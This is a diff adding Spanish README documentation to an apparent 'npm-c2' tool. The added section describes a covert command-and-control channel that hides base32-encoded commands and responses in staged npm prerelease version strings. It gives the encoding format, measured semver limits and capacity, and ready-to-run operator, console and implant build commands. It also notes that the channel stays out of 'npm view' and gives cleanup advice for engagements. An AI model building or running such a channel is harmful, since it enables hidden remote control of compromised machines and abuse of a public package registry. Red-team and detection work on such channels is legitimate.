@@ -202,3 +202,74 @@ done
   existente). No hay anillo de slots posible.
 - **HTTP en claro** contra Verdaccio: si el tráfico cruza una red no
   confiable, pon TLS delante.
+
+## Transporte por staging (npmjs cuando dist-tags ya no escribe)
+
+npm retiró los tokens clásicos y quitó la escritura directa a los granulares
+con `bypass_2fa`. Medido contra registry.npmjs.org:
+
+```
+PUT  /-/package/<pkg>/dist-tags/<tag>     -> 403  (automation token)
+POST /-/stage/package/<pkg>               -> 201  (funciona)
+```
+
+El staging es la única vía de escritura que npm sigue permitiendo a la
+automatización, y es a la que ellos mismos dicen que hay que moverse para
+2027. Así que el canal puede montarse sobre versiones staged.
+
+### Cómo se transporta
+
+El registro solo devuelve la **versión** al lector, así que el payload va ahí:
+
+```
+0.0.0-<canal>.<h><seq>.<tipo>.<payload>
+
+canal   4 chars, primero a-f  (nunca parece numérico)
+seq     "h" + 6 hex           (prefijo alfabético: los ceros a la izquierda
+                               son legales y el campo tiene ancho fijo)
+tipo    c comando | r respuesta
+payload base32 A-Z2-7         (sin 0/1, luego nunca rompe la regla semver
+                               del cero a la izquierda; 5 bits por char)
+```
+
+Restricciones de semver que obligaron a este diseño (medidas, no supuestas):
+
+- longitud total de la versión < ~250 chars (238 vale, 259 se rechaza)
+- el prerelease solo admite `[0-9A-Za-z.-]`; **el guion bajo se rechaza**
+- un identificador todo numérico no puede empezar por cero
+
+Capacidad: ~227 chars base32 ≈ **141 bytes por versión**, antes de comprimir.
+
+### Uso
+
+```bash
+# operador
+npm-c2 stage -p <pkg> -t <token> -c f00d --passphrase '<pass>' "whoami"
+
+# consola
+npm-c2 stage -p <pkg> -t <token> -c f00d --passphrase '<pass>'
+
+# implante
+python3 native/build_go.py -p <pkg> -t <token> --stage-chan f00d \
+  --passphrase '<pass>' --interval 60
+```
+
+### Diferencias con el canal de dist-tags
+
+| | dist-tags | staging |
+|---|---|---|
+| Escritura | 403 con token bypass-2fa | **funciona** |
+| Lectura | pública, sin token | **requiere token** |
+| Visible en `npm view` | sí (packument) | no |
+| Borrado | 403 | 401 (pide OTP) |
+| Basura | tags que crecen | versiones staged que crecen |
+
+El intercambio es explícito: ganas escritura, pero **el implante lleva el
+token** porque `GET /-/stage` da 401 sin él. En dist-tags la lectura era
+anónima.
+
+### Limpieza
+
+No hay API de borrado: cada mensaje deja una versión staged. Se limpian a
+mano desde npmjs.com → Staged Packages → Reject. Antes de un engagement,
+usa un canal nuevo (`-c`) para no arrastrar el histórico.
